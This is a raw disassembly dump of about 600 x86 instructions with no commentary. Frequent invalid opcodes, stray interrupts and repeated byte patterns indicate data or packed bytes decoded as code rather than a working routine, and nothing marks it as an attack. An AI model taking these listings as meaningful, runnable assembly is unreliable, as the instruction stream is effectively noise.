  425f8a:	xor    ch,cl
  425f8c:	ins    BYTE PTR es:[edi],dx
  425f8d:	test   BYTE PTR [edx],cl
  425f8f:	jbe    0x425fa5
  425f91:	int    0x76
  425f93:	in     eax,dx
  425f94:	int    0x8d
  425f96:	adc    DWORD PTR [edi],ebp
  425f98:	inc    ebp
  425f99:	jge    0x425f2d
  425f9b:	shr    ebx,cl
  425f9d:	xchg   edx,eax
  425f9e:	int    0x8d
  425fa0:	in     eax,dx
  425fa1:	int    0xa6
  425fa3:	adc    DWORD PTR [ebx],edi
  425fa5:	fnstsw WORD PTR [ebx]
  425fa7:	leave  
  425fa8:	push   ebx
  425fa9:	(bad)
  425fac:	sub    BYTE PTR [esi+0x76],bl
  425faf:	adc    al,0x2f
  425fb1:	push   es
  425fb2:	mov    esi,0xcd0000ff
  425fb7:	(bad)  
  425fb8:	std    
  425fb9:	int    0x96
  425fbb:	std    
  425fbc:	cmp    ecx,DWORD PTR [edi]
  425fbe:	shr    ebx,cl
  425fc0:	xchg   edx,eax
  425fc1:	sar    bh,0x9c
  425fc4:	cmp    esi,ecx
  425fc6:	shr    edx,cl
  425fc8:	sub    BYTE PTR [ebx+0x13],dl
  425fcb:	int    0x96
  425fcd:	std    
  425fce:	int    0xa6
  425fd0:	std    
  425fd1:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  425fd7:	popf   
  425fd8:	shl    ebp,cl
  425fda:	sub    BYTE PTR [ebx-0x2b],dl
  425fdd:	xchg   DWORD PTR [ebx],edx
  425fdf:	int    0x96
  425fe1:	std    
  425fe2:	int    0xa6
  425fe4:	std    
  425fe5:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  425feb:	popf   
  425fec:	shl    ebp,cl
  425fee:	sub    BYTE PTR [ebx-0x2b],dl
  425ff1:	xchg   DWORD PTR [ebx],edx
  425ff3:	int    0x96
  425ff5:	std    
  425ff6:	int    0xa6
  425ff8:	std    
  425ff9:	cmp    ebx,DWORD PTR [ecx-0xc2c62c5]
  425fff:	xchg   edx,eax
  426000:	shl    ebp,cl
  426002:	sub    BYTE PTR [ebx-0x2b],dl
  426005:	xchg   DWORD PTR [ebx],edx
  426007:	or     cl,bh
  426009:	nop
  42600a:	add    BYTE PTR [eax],al
  42600c:	add    ch,cl
  42600e:	lea    edx,[eax-0x33]
  426011:	xchg   esi,eax
  426012:	mov    ebp,0x3bbda6cd
  426017:	cdq    
  426018:	cmp    ebx,DWORD PTR [ebp-0x2c6d0c2d]
  42601e:	in     eax,0x28
  426020:	push   ebx
  426021:	aad    0xa
  426023:	int3   
  426024:	pop    ss
  426025:	aam    0x0
  426027:	add    BYTE PTR [eax],al
  426029:	int    0x8d
  42602b:	dec    esp
  42602c:	int    0x89
  42602e:	int    0x96
  426030:	std    
  426031:	int    0xa6
  426033:	std    
  426034:	int    0x7e
  426036:	jo     0x426073
  426038:	cdq    
  426039:	cmp    ebx,DWORD PTR [ebp-0x2c6d0c2d]
  42603f:	in     eax,0x28
  426041:	push   ebx
  426042:	aad    0xa
  426044:	int3   
  426045:	pop    ss
  426046:	aam    0x0
  426048:	add    BYTE PTR [eax],al
  42604a:	int    0x8d
  42604c:	sbb    al,0xcd
  42604e:	xchg   esi,eax
  42604f:	sbb    al,0x3b
  426051:	icebp  
  426052:	shr    edx,cl
  426054:	sub    BYTE PTR [ebx],bh
  426056:	psrlq  mm5,mm3
  426059:	xchg   edx,eax
  42605a:	push   ebx
  42605b:	adc    ecx,ebp
  42605d:	xchg   esi,eax
  42605e:	std    
  42605f:	int    0xa6
  426061:	std    
  426062:	cmp    ebx,DWORD PTR [ebp+0x3bfd76cd]
  426068:	cdq    
  426069:	shl    ebp,cl
  42606b:	sub    bl,dl
  42606d:	repz xchg edx,eax
  42606f:	push   ebx
  426070:	aad    0xcd
  426072:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426073:	std    
  426074:	cmp    edi,DWORD PTR [ecx+0x4]
  426077:	hlt    
  426078:	call   ebx
  42607a:	mov    ebp,0x28e5d392
  42607f:	push   ebx
  426080:	lds    eax,FWORD PTR [edi+0x17cc0af1]
  426086:	aam    0x0
  426088:	add    BYTE PTR [eax],al
  42608a:	int    0x8d
  42608c:	std    
  42608d:	int    0x96
  42608f:	std    
  426090:	cmp    ecx,DWORD PTR [edi]
  426092:	shr    ebx,cl
  426094:	xchg   edx,eax
  426095:	sar    bh,0x9c
  426098:	cmp    esi,ecx
  42609a:	shr    edx,cl
  42609c:	sub    BYTE PTR [ebx+0x13],dl
  42609f:	int    0x96
  4260a1:	std    
  4260a2:	int    0xa6
  4260a4:	std    
  4260a5:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  4260ab:	popf   
  4260ac:	shl    ebp,cl
  4260ae:	sub    BYTE PTR [ebx-0x2b],dl
  4260b1:	xchg   DWORD PTR [ebx],edx
  4260b3:	int    0x96
  4260b5:	std    
  4260b6:	int    0xa6
  4260b8:	std    
  4260b9:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  4260bf:	popf   
  4260c0:	shl    ebp,cl
  4260c2:	sub    BYTE PTR [ebx-0x2b],dl
  4260c5:	xchg   DWORD PTR [ebx],edx
  4260c7:	iret   
  4260c8:	xchg   esi,eax
  4260c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4260ca:	or     dl,BYTE PTR ds:0xd4cf
  4260d0:	add    bh,cl
  4260d2:	iret   
  4260d3:	nop
  4260d4:	add    BYTE PTR [eax],al
  4260d6:	add    BYTE PTR [ecx-0x33],dh
  4260d9:	(bad)  
  4260da:	std    
  4260db:	int    0x96
  4260dd:	std    
  4260de:	cmp    ecx,DWORD PTR [edi]
  4260e0:	int    0xd6
  4260e2:	sub    al,0x3b
  4260e4:	icebp  
  4260e5:	shr    ebx,cl
  4260e7:	xchg   edx,eax
  4260e8:	shr    edx,cl
  4260ea:	sub    BYTE PTR [ebx+0x13],dl
  4260ed:	jno    0x4260be
  4260ef:	pop    es
  4260f0:	out    dx,eax
  4260f1:	add    BYTE PTR [eax+0x7cd7080],0x3d
  4260f8:	add    DWORD PTR [eax+0x500080],0x7cd2496
  426102:	add    DWORD PTR [ecx+0x760a8080],eax
  426108:	dec    esp
  426109:	int    0x76
  42610b:	mov    ch,cl
  42610d:	mov    BYTE PTR [edi-0x72f5b373],al
  426113:	dec    esp
  426114:	int    0x8d
  426116:	cmc    
  426117:	int    0x96
  426119:	stc    
  42611a:	das    
  42611b:	inc    ebp
  42611c:	jecxz  0x4260b0
  42611e:	shl    ebx,cl
  426120:	xchg   edx,eax
  426121:	int    0x96
  426123:	cmc    
  426124:	int    0xd6
  426126:	stc    
  426127:	cmp    esi,edi
  426129:	shr    edx,cl
  42612b:	sub    ch,cl
  42612d:	xchg   esi,eax
  42612e:	cmc    
  42612f:	cmp    esi,eax
  426131:	push   ebx
  426132:	bswap  ebp
  426134:	(bad)  
  426135:	stc    
  426136:	das    
  426137:	inc    ebp
  426138:	sti    
  426139:	xchg   edx,eax
  42613a:	shr    edi,cl
  42613c:	xchg   edx,eax
  42613d:	int    0xd6
  42613f:	cmc    
  426140:	int    0xa6
  426142:	stc    
  426143:	cmp    ebx,ecx
  426145:	cmp    ebx,ebp
  426147:	push   ebx
  426148:	aad    0x87
  42614a:	adc    ecx,ebp
  42614c:	xchg   esi,eax
  42614d:	cmc    
  42614e:	sar    DWORD PTR [ecx-0x62932d8],cl
  426154:	das    
  426155:	inc    ebp
  426156:	sti    
  426157:	xchg   edx,eax
  426158:	shr    edi,cl
  42615a:	xchg   edx,eax
  42615b:	int    0xd6
  42615d:	cmc    
  42615e:	int    0xa6
  426160:	stc    
  426161:	cmp    ebx,ecx
  426163:	cmp    ebx,ebp
  426165:	push   ebx
  426166:	aad    0x87
  426168:	adc    ecx,ebp
  42616a:	xchg   esi,eax
  42616b:	cmc    
  42616c:	sar    DWORD PTR [ecx-0x62932d8],cl
  426172:	das    
  426173:	inc    ebp
  426174:	sti    
  426175:	xchg   edx,eax
  426176:	shr    edi,cl
  426178:	xchg   edx,eax
  426179:	int    0xd6
  42617b:	cmc    
  42617c:	cmp    ebx,ecx
  42617e:	int    0xe6
  426180:	stc    
  426181:	cmp    eax,DWORD PTR [eax]
  426183:	push   ebx
  426184:	fld    DWORD PTR [edi+0x707113]
  42618a:	(bad)  
  42618b:	dec    esp
  42618c:	sar    DWORD PTR [ecx-0x12c242d8],cl
  426192:	add    BYTE PTR [eax],al
  426194:	int    0x76
  426196:	or     eax,0xcb63a8aa
  42619b:	rcl    BYTE PTR [eax-0x80],cl
  42619e:	xchg   esi,eax
  42619f:	int    0xed
  4261a1:	add    al,0xed
  4261a3:	inc    esp
  4261a4:	pop    ebx
  4261a5:	cwde   
  4261a6:	call   0x76c9:0xcb3bdd3b
  4261ad:	popf   
  4261ae:	(bad)  
  4261af:	aaa    
  4261b0:	ficom  WORD PTR [ebx]
  4261b2:	pop    ebp
  4261b3:	mov    ebp,0xa25230a
  4261b8:	jbe    0x42615f
  4261ba:	leave  
  4261bb:	jbe    0x42617a
  4261bd:	xchg   ecx,eax
  4261be:	aaa    
  4261bf:	ficom  WORD PTR [ebx]
  4261c1:	or     dh,BYTE PTR [esi-0x13]
  4261c4:	leave  
  4261c5:	jbe    0x4261b4
  4261c7:	dec    ecx
  4261c8:	mov    al,ds:0x76c93586
  4261cd:	cmc    
  4261ce:	dec    ecx
  4261cf:	lahf   
  4261d0:	xchg   BYTE PTR ds:0x691176c9,dh
  4261d6:	and    DWORD PTR [esi+0x1176c935],eax
  4261dc:	cmp    DWORD PTR [ecx],esp
  4261de:	xchg   BYTE PTR ds:0x49f976c9,dh
  4261e4:	and    DWORD PTR [ebp+esi*1+0xa8476cf],eax
  4261eb:	jbe    0x4261e6
  4261ed:	int    0x76
  4261ef:	sbb    al,0xcd
  4261f1:	shl    BYTE PTR ds:0xcd808081,1
  4261f7:	jbe    0x426215
  4261f9:	int    0x8d
  4261fb:	sbb    al,0xcd
  4261fd:	add    DWORD PTR ds:0xcd808081,ebp
  426203:	xor    ch,cl
  426205:	pop    esp
  426206:	xchg   eax,esp
  426208:	fs int 0x96
  42620b:	popf   
  42620c:	int    0xa
  42620e:	and    eax,0xa808081
  426213:	out    0xb5,al
  426215:	int    0xe6
  426217:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426218:	das    
  426219:	inc    ebp
  42621a:	add    edx,DWORD PTR [edx-0x326def2d]
  426220:	out    0x9d,al
  426222:	int    0xa6
  426224:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426225:	adc    bh,bl
  426227:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426228:	mov    esi,0xdd3b4229
  42622d:	shr    ecx,cl
  42622f:	sub    ch,cl
  426231:	pop    esi
  426232:	push   ebx
  426233:	aad    0x43
  426235:	(bad)  
  426237:	nop
  426238:	int    0x18
  42623a:	or     dl,BYTE PTR [esi+0x1496cdf9]
  426240:	int    0x96
  426242:	xor    ch,cl
  426244:	xchg   esi,eax
  426245:	dec    esp
  426246:	iret   
  426247:	xchg   esi,eax
  426248:	lods   eax,DWORD PTR ds:[esi]
  426249:	bound  eax,QWORD PTR [eax]
  42624b:	(bad)  
  42624c:	stc    
  42624d:	jno    0x4262bf
  42624f:	cwde   
  426250:	add    dh,dl
  426252:	sbb    al,0xcf
  426254:	jbe    0x42620b
  426256:	add    dh,dl
  426258:	mov    BYTE PTR [eax],al
  42625a:	(bad)  
  42625b:	cmc    
  42625c:	add    dh,dl
  42625e:	adc    DWORD PTR [eax],eax
  426260:	(bad)  
  426261:	in     eax,dx
  426262:	jo     0x426233
  426264:	jbe    0x426263
  426266:	jo     0x426225
  426268:	stos   BYTE PTR es:[edi],al
  426269:	clc    
  42626a:	add    BYTE PTR [eax],al
  42626c:	or     dh,BYTE PTR [esi+0x1c]
  42626f:	int    0x76
  426271:	sbb    al,0xcd
  426273:	lea    esp,[edx+ecx*1]
  426276:	outs   dx,BYTE PTR ds:[esi]
  426277:	adc    al,0xcd
  426279:	jbe    0x42629f
  42627b:	leave  
  42627c:	add    BYTE PTR [edi-0x327f7f80],0x76
  426283:	lods   eax,DWORD PTR ds:[esi]
  426284:	int    0x8d
  426286:	and    al,0xa
  426288:	outs   dx,BYTE PTR ds:[esi]
  426289:	test   ch,cl
  42628b:	jbe    0x4262bd
  42628d:	int    0x8d
  42628f:	and    al,0xa
  426291:	outs   dx,BYTE PTR ds:[esi]
  426292:	mov    ch,cl
  426294:	jbe    0x4262aa
  426296:	int    0x8d
  426298:	and    al,0xa
  42629a:	outs   dx,BYTE PTR ds:[esi]
  42629b:	dec    esp
  42629c:	int    0x76
  42629e:	and    al,0xc9
  4262a0:	ins    BYTE PTR es:[edi],dx
  4262a1:	and    al,0x81
  4262a3:	add    BYTE PTR [eax-0x32e11380],0x76
  4262aa:	sbb    al,0xcd
  4262ac:	lea    ebx,[ecx*8-0x7f7ed2ff]
  4262b3:	or     ch,0xa
  4262b6:	and    eax,0xcd808081
  4262bb:	xor    BYTE PTR [ebx],0x81
  4262be:	or     dh,BYTE PTR [esi-0x3]
  4262c1:	int    0x76
  4262c3:	std    
  4262c4:	stos   BYTE PTR es:[edi],al
  4262c5:	test   al,0x63
  4262c7:	retf   
  4262c8:	rcr    BYTE PTR [eax+eax*4],cl
  4262cb:	xchg   esi,eax
  4262cc:	int    0xed
  4262ce:	int    0x76
  4262d0:	dec    esp
  4262d1:	adc    ch,ch
  4262d3:	cmp    eax,0x5b808081
  4262d8:	cwde   
  4262d9:	call   0x2f35:0x86214966
  4262e0:	push   es
  4262e1:	mov    ecx,0xcd80804a
  4262e6:	jbe    0x426318
  4262e8:	inc    cx
  4262ea:	and    DWORD PTR [esi-0x62f9d0cb],eax
  4262f0:	dec    edx
  4262f1:	add    BYTE PTR [eax-0x29128937],0x37
  4262f8:	ficom  WORD PTR [ebx]
  4262fa:	pop    ebp
  4262fb:	mov    ebp,0xa25230a
  426300:	jbe    0x426313
  426302:	leave  
  426303:	jbe    0x4262ba
  426305:	xchg   ecx,eax
  426306:	aaa    
  426307:	ficom  WORD PTR [ebx]
  426309:	or     dh,BYTE PTR [esi-0x43]
  42630c:	int    0x76
  42630e:	mov    BYTE PTR [edx],cl
  426310:	jbe    0x426307
  426312:	int    0x76
  426314:	cmc    
  426315:	int    0x1
  426317:	mov    ebp,0xcd808081
  42631c:	or     ch,0x80
  42631f:	or     dh,BYTE PTR [esi-0x7]
  426322:	pop    edi
  426323:	jle    0x42635a
  426325:	add    BYTE PTR [eax-0x7fca69a3],0x80
  42632c:	mov    eax,0x4b0760a
  426331:	ins    DWORD PTR es:[edi],dx
  426332:	(bad)  
  426333:	mov    eax,0xcda2760a
  426338:	sar    DWORD PTR [eax+0x5d15760a],cl
  42633e:	(bad)  
  42633f:	xor    eax,0xf1cd8080
  426344:	mov    eax,0xcf19960a
  426349:	nop
  42634a:	xchg   edx,eax
  42634b:	iret   
  42634c:	sahf   
  42634d:	(bad)  
  42634e:	int    0x99
  426350:	mov    eax,0xcd1d960a
  426355:	aad    0xb8
  426357:	or     dl,BYTE PTR [esi-0x662dfbdf]
  42635d:	mov    eax,0xcf01960a
  426362:	jno    0x4263b8
  426364:	int    0x3
  426366:	mov    eax,0x40be60a
  42636b:	leave  
  42636c:	xchg   ebp,eax
  42636d:	mov    eax,0xcf05e60a
  426372:	ficomp WORD PTR [eax-0x48]
  426375:	or     ah,dh
  426377:	pop    es
  426378:	mov    eax,0xb809760a
  42637d:	or     dl,dh
  42637f:	retf   0xc5cd
  426382:	mov    eax,0xb8cc760a
  426387:	or     dl,BYTE PTR [edi]
  426389:	ins    BYTE PTR es:[edi],dx
  42638a:	add    BYTE PTR [eax],al
  42638c:	add    BYTE PTR [ebp*2+0x60ab8d0],al
  426393:	push   edx
  426394:	add    BYTE PTR [eax],al
  426396:	add    bh,cl
  426398:	outs   dx,BYTE PTR ds:[esi]
  426399:	add    edi,DWORD PTR [eax+0x74060a]
  42639f:	add    BYTE PTR [eax],al
  4263a1:	add    al,0x6d
  4263a3:	inc    edx
  4263a4:	mov    eax,0x78060a
  4263a9:	add    BYTE PTR [eax],al
  4263ab:	iret   
  4263ac:	outs   dx,BYTE PTR ds:[esi]
  4263ad:	xor    BYTE PTR [eax+0x7c060a],bh
  4263b3:	add    BYTE PTR [eax],al
  4263b5:	add    al,0x6d
  4263b7:	xor    bh,BYTE PTR [eax+0x8a060a]
  4263bd:	add    BYTE PTR [eax],al
  4263bf:	mov    eax,0x8ccf0a
  4263c4:	add    BYTE PTR [eax],al
  4263c6:	int    0xc5
  4263c8:	mov    eax,0x8e060a
  4263cd:	add    BYTE PTR [eax],al
  4263cf:	int    0x76
  4263d1:	in     eax,dx
  4263d2:	int    0x8d
  4263d4:	adc    DWORD PTR [edi],ebp
  4263d6:	inc    ebp
  4263d7:	jge    0x42636b
  4263d9:	shr    ebx,cl
  4263db:	xchg   edx,eax
  4263dc:	int    0x8d
  4263de:	in     eax,dx
  4263df:	int    0x96
  4263e1:	adc    ebx,eax
  4263e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4263e4:	mov    esi,0xc93b4229
  4263e9:	cmp    ebx,edx
  4263eb:	shl    edx,cl
  4263ed:	sub    BYTE PTR [ebx-0x2e],dl
  4263f0:	in     al,dx
  4263f1:	outs   dx,BYTE PTR ds:[esi]
  4263f2:	iret   
  4263f3:	aam    0x76
  4263f5:	mov    al,0xb8
  4263f7:	int    0x4e
  4263f9:	das    
  4263fa:	mov    ebx,0xcbbb2f18
  4263ff:	cmp    ecx,DWORD PTR [edx+edx*1]
  426402:	sti    
  426403:	and    DWORD PTR ds:0xf3e38080,esi
  426409:	shl    edx,cl
  42640b:	das    
  42640c:	push   ebx
  42640d:	adc    ecx,DWORD PTR [ecx]
  42640f:	int3   
  426410:	test   DWORD PTR [ebp-0x32ffff01],esp
  426416:	lea    esi,[ebp+0x2fbd96cd]
  42641c:	inc    ebp
  42641d:	jecxz  0x4263b1
  42641f:	shl    ebx,cl
  426421:	xchg   edx,eax
  426422:	int    0x96
  426424:	mov    ch,0xcd
  426426:	(bad)  
  426427:	mov    ebp,0xf73bf03b
  42642c:	push   ebx
  42642d:	psrlq  mm5,mm2
  426430:	sub    BYTE PTR [edi-0x7906fb2d],al
  426436:	(bad)  
  426437:	popa   
  426438:	int    0x76
  42643a:	in     eax,dx
  42643b:	int    0x8d
  42643d:	adc    DWORD PTR [edi],ebp
  42643f:	inc    ebp
  426440:	jge    0x4263d4
  426442:	shr    ebx,cl
  426444:	xchg   edx,eax
  426445:	int    0x8d
  426447:	in     eax,dx
  426448:	int    0x96
  42644a:	adc    DWORD PTR [ebx],edi
  42644c:	leave  
  42644d:	cmp    ebx,edx
  42644f:	shl    edx,cl
  426451:	sub    BYTE PTR [ebx-0x2e],dl
  426454:	in     al,dx
  426455:	outs   dx,BYTE PTR ds:[esi]
  426456:	iret   
  426457:	aam    0x76
  426459:	add    DWORD PTR [eax-0x44d0b133],edi
  42645f:	sbb    BYTE PTR [edi],ch
  426461:	mov    ebx,0x120c3bcb
  426466:	sti    
  426467:	and    DWORD PTR ds:0xf3e38080,esi
  42646d:	shl    edx,cl
  42646f:	das    
  426470:	push   ebx
  426471:	adc    ecx,DWORD PTR [ecx]
  426473:	int3   
  426474:	test   esp,ecx
  426476:	inc    DWORD PTR [eax]
  426478:	add    ch,cl
  42647a:	lea    esi,[ebp+0x2fbd96cd]
  426480:	inc    ebp
  426481:	jecxz  0x426415
  426483:	shl    ebx,cl
  426485:	xchg   edx,eax
  426486:	int    0x96
  426488:	mov    ch,0xcd
  42648a:	(bad)  
  42648b:	mov    ebp,0xf73bf03b
  426490:	push   ebx
  426491:	psrlq  mm5,mm2
  426494:	sub    BYTE PTR [edi-0x7406fb2d],al
  42649a:	(bad)  
  42649b:	popa   
  42649c:	int    0x76
  42649e:	in     eax,dx
  42649f:	int    0x8d
  4264a1:	adc    DWORD PTR [edi],ebp
  4264a3:	inc    ebp
  4264a4:	jge    0x426438
  4264a6:	shr    ebx,cl
  4264a8:	xchg   edx,eax
  4264a9:	int    0x8d
  4264ab:	in     eax,dx
  4264ac:	int    0x96
  4264ae:	adc    DWORD PTR [ebx],edi
  4264b0:	leave  
  4264b1:	cmp    ebx,edx
  4264b3:	shl    edx,cl
  4264b5:	sub    BYTE PTR [ebx-0x2e],dl
  4264b8:	in     al,dx
  4264b9:	je     0x42648a
  4264bb:	push   ebp
  4264bc:	jbe    0x42652a
  4264be:	add    BYTE PTR [eax],al
  4264c0:	add    BYTE PTR [eax-0x44d0b133],bh
  4264c6:	sbb    BYTE PTR [edi],ch
  4264c8:	mov    ebx,0x120c3bcb
  4264cd:	sti    
  4264ce:	and    DWORD PTR ds:0xf3e38080,esi
  4264d4:	shl    edx,cl
  4264d6:	das    
  4264d7:	push   ebx
  4264d8:	adc    ecx,DWORD PTR [ecx]
  4264da:	int3   
  4264db:	test   DWORD PTR ds:0xcd0000ff,eax
  4264e1:	lea    esi,[ebp+0x2fbd96cd]
  4264e7:	inc    ebp
  4264e8:	jecxz  0x42647c
  4264ea:	shl    ebx,cl
  4264ec:	xchg   edx,eax
  4264ed:	int    0x96
  4264ef:	mov    ch,0xcd
  4264f1:	(bad)  
  4264f2:	mov    ebp,0xf73bf03b
  4264f7:	push   ebx
  4264f8:	psrlq  mm5,mm2
  4264fb:	sub    BYTE PTR [edi-0x7706fb2d],al
  426501:	(bad)  
  426502:	mov    ebx,0xffb506cf
  426507:	add    BYTE PTR [eax],al
  426509:	or     dh,BYTE PTR [esi-0x7]
  42650c:	int    0x76
  42650e:	stc    
  42650f:	pop    edi
  426510:	inc    esi
  426511:	pop    esp
  426512:	inc    ebp
  426513:	xchg   edi,eax
  426514:	or     cl,BYTE PTR [eax+0x79245161]
  42651a:	daa    
  42651b:	or     dh,BYTE PTR [eax-0x7c]
  42651e:	int    0x6
  426520:	mov    ch,0xff
  426522:	add    BYTE PTR [eax],al
  426524:	int    0x57
  426526:	mov    ebp,0xa0000ff
  42652b:	(bad)  
  42652c:	mov    ebp,0x8621d169
  426531:	xor    eax,0x62fd343
  426536:	pusha  
  426537:	add    DWORD PTR [eax-0x4269a180],0x8151062f
  426541:	add    BYTE PTR [eax-0x7fca76a3],0x80
  426548:	mov    eax,0xfff9060a
  42654d:	add    BYTE PTR [eax],al
  42654f:	int    0xc5
  426551:	mov    eax,0xff03060a
  426556:	add    BYTE PTR [eax],al
  426558:	pop    ebp
  426559:	es xor eax,0xab88080
  42655f:	push   es
  426560:	std    
  426561:	inc    DWORD PTR [eax]
  426563:	add    BYTE PTR [ebp-0x5d],bl
  426566:	xor    eax,0xab88080
  42656b:	push   es
  42656c:	(bad)  
  42656d:	inc    DWORD PTR [eax]
  42656f:	add    BYTE PTR [ebp+0x1e],bl
  426572:	xor    eax,0xab88080
  426577:	push   es
  426578:	add    BYTE PTR [eax],0x0
  42657b:	add    BYTE PTR [ebp*2-0x47823218],al
  426582:	or     cl,bh
  426584:	xchg   edx,eax
  426585:	add    BYTE PTR [eax],al
  426587:	add    ch,cl
  426589:	jbe    0x4265bb
  42658b:	pop    edi
  42658c:	dec    ebx
  42658d:	xor    eax,0xab88080
  426592:	iret   
  426593:	test   BYTE PTR [eax],al
  426595:	add    BYTE PTR [eax],al
  426597:	add    al,0xd3
  426599:	bound  edi,QWORD PTR [eax+0x86cf0a]
  42659f:	add    BYTE PTR [eax],al
  4265a1:	pop    edi
  4265a2:	push   esi
  4265a3:	xor    eax,0xab88080
  4265a8:	iret   
  4265a9:	mov    BYTE PTR [eax],al
  4265ab:	add    BYTE PTR [eax],al
  4265ad:	add    al,0xd3
  4265af:	pushf  
  4265b0:	mov    eax,0x4acf0a
  4265b5:	add    BYTE PTR [eax],al
  4265b7:	int    0xc
  4265b9:	mov    eax,0x4ccf0a
  4265be:	add    BYTE PTR [eax],al
  4265c0:	pop    edi
  4265c1:	add    al,0x35
  4265c3:	add    BYTE PTR [eax+0x4ecf0ab8],0x0
  4265ca:	add    BYTE PTR [eax],al
  4265cc:	cmp    edi,DWORD PTR [ecx+0x5f]
  4265cf:	adc    DWORD PTR [eax-0x80],edx
  4265d2:	cmp    BYTE PTR [eax+0x30cf0a],0x0
  4265d9:	add    bl,dl
  4265db:	mov    ebp,0x151a5f92
  4265e0:	add    BYTE PTR [eax+0x22cf0ab8],0x0
  4265e7:	add    BYTE PTR [eax],al
  4265e9:	pop    edi
  4265ea:	call   0xcf0a:0xb88080eb
  4265f1:	adc    al,0x0
  4265f3:	add    BYTE PTR [eax],al
  4265f5:	int    0x8d
  4265f7:	xor    BYTE PTR [edx+eax*1],al
  4265fa:	call   ebx
  4265fc:	repnz sub BYTE PTR [ebx-0x2d],dl
  426600:	or     al,BYTE PTR [esi]
  426602:	adc    eax,0xcd0000ff
  426607:	jbe    0x426655
  426609:	int    0x8d
  42660b:	dec    esp
  42660c:	cmp    edi,DWORD PTR [ecx-0x2d]
  42660f:	mov    ebp,0xff020492
  426614:	shl    edx,cl
  426616:	sub    BYTE PTR [ebx-0x2d],dl
  426619:	leave  
  42661a:	add    eax,0xff1d06
  42661f:	add    BYTE PTR [eax],al
  426621:	add    BYTE PTR [eax+0x1506cf80],al
  426627:	inc    DWORD PTR [eax]
  426629:	add    BYTE PTR [eax-0x33],dh
  42662c:	jbe    0x42665e
  42662e:	int    0x8d
  426630:	xor    BYTE PTR [ebx],bh
  426632:	jns    0x426607
  426634:	mov    ebp,0xff020492
  426639:	shl    edx,cl
  42663b:	sub    BYTE PTR [ebx-0x2d],dl
  42663e:	jo     0x42660f
  426640:	push   es
  426641:	stc    
  426642:	inc    DWORD PTR [eax]
  426644:	add    BYTE PTR [eax-0x33],dh
  426647:	jbe    0x42663e
  426649:	int    0x1
  42664b:	cmp    eax,0xc9808081
  426650:	push   es
  426651:	sbb    BYTE PTR [eax],al
  426653:	add    BYTE PTR [eax],al
  426655:	inc    eax
  426656:	retf   
  426657:	fwait
  426658:	xor    eax,0x76cd5000
  42665d:	adc    al,0x0
  42665f:	icebp  
  426660:	or     dh,BYTE PTR [esi-0x7]
  426663:	int    0x76
  426665:	stc    
  426666:	push   es
  426667:	ins    DWORD PTR es:[edi],dx
  426668:	aam    0x4a
  42666a:	adc    dl,BYTE PTR [esi+0x68]
  42666d:	or     BYTE PTR [ebx+ecx*1],bl
  426670:	fmul   QWORD PTR [ebx-0x17]
  426673:	(bad)  
  426674:	int    0x8d
  426676:	dec    esp
  426677:	int    0x96
  426679:	dec    esp
  42667a:	sar    bh,0x3b
  42667d:	setl   BYTE PTR [ebx]
  426680:	icebp  
  426681:	shr    edx,cl
  426683:	sub    bl,dl
  426685:	jmp    0x426619
  426687:	push   ebx
  426688:	adc    ecx,ebp
  42668a:	xchg   esi,eax
  42668b:	cmc    
  42668c:	int    0xa2
  42668e:	and    eax,0x5e808081
  426693:	dec    edx
  426694:	das    
  426695:	push   es
  426696:	popa   
  426697:	test   DWORD PTR [eax+0x4c8dcd80],eax
  42669d:	int    0x96
  42669f:	dec    esp
  4266a0:	cmp    ecx,DWORD PTR [edi]
  4266a2:	shr    ebx,cl
  4266a4:	xchg   edx,eax
  4266a5:	cmp    esi,ecx
  4266a7:	shr    edx,cl
  4266a9:	sub    BYTE PTR [ebx+0x13],dl
  4266ac:	int    0x96
  4266ae:	cmc    
  4266af:	int    0xa2
  4266b1:	in     al,0x81
  4266b3:	add    BYTE PTR [eax-0x7232b5f6],0x4c
  4266ba:	int    0x96
  4266bc:	dec    esp
  4266bd:	cmp    ecx,DWORD PTR [edi]
  4266bf:	shr    ebx,cl
  4266c1:	xchg   edx,eax
  4266c2:	cmp    esi,ecx
  4266c4:	shr    edx,cl
  4266c6:	sub    BYTE PTR [ebx+0x13],dl
  4266c9:	int    0x96
  4266cb:	cmc    
  4266cc:	int    0xa2
  4266ce:	add    DWORD PTR [ecx+0x4a0a8080],eax
  4266d4:	pop    edi
  4266d5:	xor    ax,0x8080
  4266d9:	mov    eax,0x24cf0a
  4266de:	add    BYTE PTR [eax],al
  4266e0:	int    0xc
  4266e2:	mov    eax,0x28cf0a
  4266e7:	add    BYTE PTR [eax],al
  4266e9:	pop    edi
  4266ea:	es xor eax,0xab88080
  4266f0:	iret   
  4266f1:	sub    al,0x0
  4266f3:	add    BYTE PTR [eax],al
  4266f5:	pop    edi
  4266f6:	daa    
  4266f7:	xor    eax,0xab88080
  4266fc:	iret   
  4266fd:	xor    al,BYTE PTR [eax]
  4266ff:	add    BYTE PTR [eax],al
  426701:	add    al,0xd3
  426703:	test   eax,0x34cf0ab8
  426708:	add    BYTE PTR [eax],al
  42670a:	add    BYTE PTR [edi-0x69],bl
  42670d:	xor    eax,0xab88080
  426712:	iret   
  426713:	cmp    BYTE PTR [eax],al
  426715:	add    BYTE PTR [eax],al
  426717:	add    al,0xd3
  426719:	mov    dl,0xb8
  42671b:	or     cl,bh
  42671d:	cmp    al,0x0
  42671f:	add    BYTE PTR [eax],al
  426721:	pop    edi
  426722:	fwait
  426723:	xor    eax,0xab88080
  426728:	iret   
  426729:	inc    eax
  42672a:	add    BYTE PTR [eax],al
  42672c:	add    ch,cl
  42672e:	or     al,0xb8
  426730:	or     cl,bh
  426732:	inc    esp
  426733:	add    BYTE PTR [eax],al
  426735:	add    BYTE PTR [edi+0x17],bl
  426738:	xor    eax,0xab88080
  42673d:	iret   
  42673e:	dec    eax
  42673f:	add    BYTE PTR [eax],al
  426741:	add    BYTE PTR [edi+0x26],bl
  426744:	pop    esi
  426745:	add    BYTE PTR [eax+0x50cf0ab8],0x0
  42674c:	add    BYTE PTR [eax],al
  42674e:	pop    edi
